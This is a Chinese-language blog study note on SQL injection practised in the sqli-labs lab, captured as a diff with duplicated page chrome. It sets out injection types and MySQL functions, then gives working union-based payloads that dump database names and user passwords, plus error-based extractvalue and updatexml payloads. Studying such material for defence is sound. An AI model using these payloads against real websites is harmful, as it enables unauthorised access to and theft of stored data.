id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="/cover/sql.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2026/05/14/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"><header><a class="post-meta-categories" href="/categories/study/" itemprop="url">study</a><a href="/tags/study/" tabindex="-1" itemprop="url">study</a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url">sql注入</a><a href="/tags/web%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">web安全</a><h1 id="CrawlerTitle" itemprop="name headline">SQL 注入学习笔记</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">cHr1s</span><time itemprop="dateCreated datePublished" datetime="2026-05-14T01:09:22.000Z" title="发表于 2026-05-14 09:09:22">2026-05-14</time><time itemprop="dateCreated datePublished" datetime="2026-05-14T12:02:12.979Z" title="更新于 2026-05-14 20:02:12">2026-05-14</time></header><center> SQL 注入学习笔记 </center>
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">cHr1s's bolg</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">SQL注入<sup>2</sup></a><a href="/tags/basics/" style="font-size: 1.05rem;">basics<sup>3</sup></a><a href="/tags/ctf/" style="font-size: 1.05rem;">ctf<sup>4</sup></a><a href="/tags/hexo%E8%A3%85%E4%BF%AE%E6%97%A5%E8%AE%B0/" style="font-size: 1.05rem;">hexo装修日记<sup>2</sup></a><a href="/tags/sqli-labs/" style="font-size: 1.05rem;">sqli-labs<sup>1</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">sql注入<sup>1</sup></a><a href="/tags/study/" style="font-size: 1.05rem;">study<sup>1</sup></a><a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">web安全<sup>4</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>1</sup></a><a href="/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" style="font-size: 1.05rem;">刷题记录<sup>3</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>1</sup></a><a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 1.05rem;">杂项<sup>1</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">测试<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">靶场<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/05/"><span class="card-archive-list-date">五月 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/11/"><span class="card-archive-list-date">十一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/06/"><span class="card-archive-list-date">六月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/04/"><span class="card-archive-list-date">四月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">十一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/study/" itemprop="url">study</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/study/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>study</span></a><a class="article-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>sql注入</span></a><a class="article-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>web安全</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SQL 注入学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2026-05-14T01:09:22.000Z" title="发表于 2026-05-14 09:09:22">2026-05-14</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2026-05-15T13:28:39.928Z" title="更新于 2026-05-15 21:28:39">2026-05-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="SQL 注入学习笔记"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="/cover/sql.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2026/05/14/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"><header><a class="post-meta-categories" href="/categories/study/" itemprop="url">study</a><a href="/tags/study/" tabindex="-1" itemprop="url">study</a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url">sql注入</a><a href="/tags/web%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">web安全</a><h1 id="CrawlerTitle" itemprop="name headline">SQL 注入学习笔记</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">cHr1s</span><time itemprop="dateCreated datePublished" datetime="2026-05-14T01:09:22.000Z" title="发表于 2026-05-14 09:09:22">2026-05-14</time><time itemprop="dateCreated datePublished" datetime="2026-05-15T13:28:39.928Z" title="更新于 2026-05-15 21:28:39">2026-05-15</time></header><center> SQL 注入学习笔记 </center>
 
 <span id="more"></span>
 
 <h1 id="SQL-注入学习笔记"><a href="#SQL-注入学习笔记" class="headerlink" title="SQL 注入学习笔记"></a><center>SQL 注入学习笔记</center></h1><p><strong>基于sqli-libs靶场的学习记录</strong></p>
 <hr>
+<h2 id="SQL-注入概述"><a href="#SQL-注入概述" class="headerlink" title="SQL 注入概述"></a>SQL 注入概述</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>SQL 注入是一种将 SQL 代码<strong>插入或添加</strong>到应用（用户）的输入参数中，再将这些参数传递给后台 SQL 服务器加以解析并执行。如果 Web 应用未对动态构造的 SQL 语句所使用的参数进行<strong>正确性审查</strong>，那么攻击者就很可能修改后台 SQL 语句的构造。一旦攻击者能够修改 SQL 语句，该语句将拥有与应用用户相同的运行权限。</p>
+<h3 id="Web-页面类型"><a href="#Web-页面类型" class="headerlink" title="Web 页面类型"></a>Web 页面类型</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>特点</th>
+<th>安全性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>静态网页</strong>（.html&#x2F;.htm）</td>
+<td>不依赖数据库，灵活性差，交互性差</td>
+<td>安全，不存在 SQL 注入</td>
+</tr>
+<tr>
+<td><strong>动态网页</strong>（.php&#x2F;.asp 等）</td>
+<td>依赖数据库，灵活、交互性强，维护方便</td>
+<td>存在 SQL 注入风险</td>
+</tr>
+<tr>
+<td><strong>伪静态网页</strong>（.html 伪装）</td>
+<td>通过 URL 重写隐藏动态参数，本质仍是动态</td>
+<td>测试时可直接对 <code>.html</code> 前参数加 <code>&#39;</code> 判断</td>
+</tr>
+</tbody></table>
+<h3 id="动态网站工作流程"><a href="#动态网站工作流程" class="headerlink" title="动态网站工作流程"></a>动态网站工作流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">客户端 → 请求(如 Article.php?id=36) → 脚本引擎 → 动态构造 SQL → 数据库 → 返回数据 → 生成静态页 → 返回客户端</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQL-注入起源"><a href="#SQL-注入起源" class="headerlink" title="SQL 注入起源"></a>SQL 注入起源</h3><ol>
+<li>程序员水平和经验欠缺，对 SQL 注入没有防范意识</li>
+<li>许多教程或模板存在 SQL 注入漏洞</li>
+<li>网上给出的许多解决办法并未从根本上解决问题</li>
+<li>数据库管理员对数据库权限设置不合理</li>
+</ol>
+<h3 id="SQL-注入典型攻击手段"><a href="#SQL-注入典型攻击手段" class="headerlink" title="SQL 注入典型攻击手段"></a>SQL 注入典型攻击手段</h3><ol>
+<li>判断应用程序是否存在注入漏洞</li>
+<li>收集信息，判断数据库类型</li>
+<li>根据注入参数类型，重构 SQL 语句原貌</li>
+<li>猜解当前库名、表名、字段名，查询数据</li>
+<li>获取账户信息、攻击 Web 或为下一步攻击做准备</li>
+</ol>
+<h3 id="SQL-注入危害"><a href="#SQL-注入危害" class="headerlink" title="SQL 注入危害"></a>SQL 注入危害</h3><ul>
+<li>数据库信息泄漏</li>
+<li>网页篡改</li>
+<li>数据库被恶意操作（增删改）</li>
+<li>服务器被远程控制</li>
+<li>种植木马（写入 webshell）</li>
+</ul>
+<hr>
+<h2 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h2><h3 id="按注入点类型"><a href="#按注入点类型" class="headerlink" title="按注入点类型"></a>按注入点类型</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>URL 形式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>数字型</td>
+<td><code>http://xxx.com/news.php?id=1</code></td>
+</tr>
+<tr>
+<td>字符型</td>
+<td><code>http://xxx.com/news.php?name=admin</code></td>
+</tr>
+<tr>
+<td>搜索型</td>
+<td><code>http://xxx.com/news.php?keyword=admin</code></td>
+</tr>
+</tbody></table>
+<h3 id="按数据提交方式"><a href="#按数据提交方式" class="headerlink" title="按数据提交方式"></a>按数据提交方式</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>GET 注入</strong></td>
+<td>注入点在 URL 参数部分</td>
+</tr>
+<tr>
+<td><strong>POST 注入</strong></td>
+<td>注入点在 POST 请求体中，常发生在表单</td>
+</tr>
+<tr>
+<td><strong>Cookie 注入</strong></td>
+<td>注入点在 Cookie 的某个字段中</td>
+</tr>
+<tr>
+<td><strong>HTTP 头注入</strong></td>
+<td>注入点在 User-Agent、Referer、X-Forwarded-For 等头部字段</td>
+</tr>
+</tbody></table>
+<h3 id="按执行效果"><a href="#按执行效果" class="headerlink" title="按执行效果"></a>按执行效果</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>联合查询注入</strong></td>
+<td>使用 UNION 合并查询结果，页面直接回显</td>
+</tr>
+<tr>
+<td><strong>报错注入</strong></td>
+<td>页面返回数据库错误信息，借助报错函数回显</td>
+</tr>
+<tr>
+<td><strong>布尔盲注</strong></td>
+<td>无回显无报错，根据页面返回 True&#x2F;False 判断</td>
+</tr>
+<tr>
+<td><strong>时间盲注</strong></td>
+<td>无任何差异，利用 <code>sleep()</code> 构造时间延迟判断</td>
+</tr>
+<tr>
+<td><strong>堆叠查询</strong></td>
+<td>同时执行多条 SQL 语句</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="SQL-注入常用函数"><a href="#SQL-注入常用函数" class="headerlink" title="SQL 注入常用函数"></a>SQL 注入常用函数</h2><h3 id="MySQL-系统信息函数"><a href="#MySQL-系统信息函数" class="headerlink" title="MySQL 系统信息函数"></a>MySQL 系统信息函数</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>user()</code></td>
+<td>当前用户名</td>
+</tr>
+<tr>
+<td><code>database()</code></td>
+<td>当前数据库名</td>
+</tr>
+<tr>
+<td><code>current_user()</code></td>
+<td>当前用户名（可查看权限）</td>
+</tr>
+<tr>
+<td><code>version()</code></td>
+<td>数据库版本</td>
+</tr>
+<tr>
+<td><code>@@datadir</code></td>
+<td>数据库存储路径</td>
+</tr>
+<tr>
+<td><code>@@version_compile_os</code></td>
+<td>操作系统版本</td>
+</tr>
+<tr>
+<td><code>show global variables like &#39;secure%&#39;</code></td>
+<td>查看文件读写权限</td>
+</tr>
+</tbody></table>
+<h3 id="字符串操作函数"><a href="#字符串操作函数" class="headerlink" title="字符串操作函数"></a>字符串操作函数</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>concat(str1,str2...)</code></td>
+<td>连接字符串（多个参数）</td>
+</tr>
+<tr>
+<td><code>group_concat(str1,str2...)</code></td>
+<td>连接字符串，能将同列多行组合为一行</td>
+</tr>
+<tr>
+<td><code>length(str)</code></td>
+<td>返回字符串长度</td>
+</tr>
+<tr>
+<td><code>hex(str)</code></td>
+<td>字符转换为十六进制</td>
+</tr>
+<tr>
+<td><code>ascii(str)</code></td>
+<td>返回字符串第一个字符的 ASCII 码</td>
+</tr>
+</tbody></table>
+<h3 id="注释方式"><a href="#注释方式" class="headerlink" title="注释方式"></a>注释方式</h3><table>
+<thead>
+<tr>
+<th>注释类型</th>
+<th>语法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>单行注释</td>
+<td><code># 内容</code></td>
+<td><code>#</code> 后直接加内容</td>
+</tr>
+<tr>
+<td>单行注释</td>
+<td><code>-- 内容</code></td>
+<td><code>--</code> 后<strong>必须加空格</strong></td>
+</tr>
+<tr>
+<td>多行注释</td>
+<td><code>/**/</code></td>
+<td>中间可跨行</td>
+</tr>
+<tr>
+<td>内联注释</td>
+<td><code>/*!...*/</code></td>
+<td>MySQL 特有，可绕过 WAF；<code>/*!50001*/</code> 表示版本 &gt;&#x3D; 5.00.01 时执行</td>
+</tr>
+</tbody></table>
+<hr>
 <h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><h3 id="1-判断是否存在-SQL-注入"><a href="#1-判断是否存在-SQL-注入" class="headerlink" title="1. 判断是否存在 SQL 注入"></a>1. 判断是否存在 SQL 注入</h3><p>使用单引号 <code>&#39;</code> 或其他闭合符号测试。</p>
-<h3 id="2-判断闭合字符"><a href="#2-判断闭合字符" class="headerlink" title="2. 判断闭合字符"></a>2. 判断闭合字符</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-判断闭合字符"><a href="#2-判断闭合字符" class="headerlink" title="2. 判断闭合字符"></a>2. 判断闭合字符</h3><p>不同类型闭合的判断方式：</p>
+<p><strong>数字型：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>   <span class="comment">-- 正常</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>   <span class="comment">-- 异常</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="3-判断列数"><a href="#3-判断列数" class="headerlink" title="3. 判断列数"></a>3. 判断列数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> N</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> N</span><br></pre></td></tr></table></figure>
+<p><strong>单引号字符型：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;                -- 异常（闭合符号为 &#x27;</span>）</span><br><span class="line"><span class="string">&#x27; and 1=1 --+    -- 正常</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+    -- 异常</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="4-确定回显位置"><a href="#4-确定回显位置" class="headerlink" title="4. 确定回显位置"></a>4. 确定回显位置</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>双引号字符型：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;                -- 异常（闭合符号为 &quot;）</span><br><span class="line">&quot; and 1=1 --+    -- 正常</span><br><span class="line">&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+    -- 异常</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>括号+双引号型：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;)               -- 异常（闭合符号为 &quot;)）</span><br><span class="line">&quot;) and 1=1 --+   -- 正常</span><br><span class="line">&quot;) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+   -- 异常</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>本质：</strong> 先加 <code>&#39;</code> 测试，报错说明存在注入；再根据报错信息或 <code>and 1=1/1=2</code> 确定具体闭合字符。</p>
+</blockquote>
+<h3 id="3-判断列数"><a href="#3-判断列数" class="headerlink" title="3. 判断列数"></a>3. 判断列数</h3><p><code>UNION</code> 内部的 <code>SELECT</code> 语句必须拥有<strong>相同数量的列</strong>，列也须拥有<strong>相似的数据类型</strong>，且列的顺序必须相同。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> N   <span class="comment">-- N 从 1 递增，正常→异常的分界点即为列数</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> N   <span class="comment">-- 同上</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>示例：</strong> <code>order by 4</code> 正常，<code>order by 5</code> 异常 → 共 4 列。</p>
+<h3 id="4-确定回显位置"><a href="#4-确定回显位置" class="headerlink" title="4. 确定回显位置"></a>4. 确定回显位置</h3><p>因为并非所有列都会被页面显示，需找出实际被使用的列，然后在对应位置插入 payload。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br><span class="line"><span class="string">-- 页面回显 2 和 3，则回显位为第 2、3 列</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="5-查询数据库"><a href="#5-查询数据库" class="headerlink" title="5. 查询数据库"></a>5. 查询数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),3 --+</span></span><br></pre></td></tr></table></figure>
 
@@ -225,27 +457,29 @@ if (true) {
 <h3 id="8-查询数据"><a href="#8-查询数据" class="headerlink" title="8. 查询数据"></a>8. 查询数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(id,&#x27;</span><span class="operator">-</span><span class="string">&#x27;,username,&#x27;</span><span class="operator">-</span><span class="string">&#x27;,password) from users),3 --+</span></span><br></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><p><code>extractvalue(参数1, 参数2)</code></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><p><code>extractvalue(XML_document, XPath_string)</code></p>
 <ul>
-<li><strong>参数1</strong>：填入 <code>1</code> 作为占位符（原本这里应该放 XML 文档对象）。</li>
-<li><strong>参数2</strong>：填入 <code>concat(0x7e,(select database()),0x7e)</code>。<code>(select database())</code> 先执行，查出当前数据库名，拼接为 <code>~database~</code>。</li>
+<li><strong>参数1（XML_document）</strong>：XML 文档对象的名称，注入时填入 <code>1</code> 作为占位符。</li>
+<li><strong>参数2（XPath_string）</strong>：XPath 格式的字符串。注入时写入<strong>错误的格式</strong>（如 <code>concat(0x7e,(select database()),0x7e)</code>），触发报错显示信息。</li>
 </ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>
 
-<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p><code>updatexml(参数1, 参数2, 参数3)</code></p>
-<p>与 <code>extractvalue</code> 极其相似，只是多了一个参数。</p>
+<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p><code>updatexml(XML_document, XPath_string, new_value)</code></p>
 <ul>
-<li><strong>参数1</strong>：填入 <code>1</code> 作为占位符（原本的 XML 文档对象）。</li>
-<li><strong>参数2</strong>：填入 <code>concat(0x7e,(select database()),0x7e)</code>，制造非法的 XPath 路径。</li>
-<li><strong>参数3</strong>：填入 <code>1</code> 作为占位符（原本是要更新成的新值）。</li>
+<li><strong>参数1（XML_document）</strong>：XML 文档对象的名称，占位填入 <code>1</code>。</li>
+<li><strong>参数2（XPath_string）</strong>：XPath 格式字符串，制造非法路径触发报错。</li>
+<li><strong>参数3（new_value）</strong>：替换查找到的符合条件数据，占位填入 <code>1</code>。</li>
 </ul>
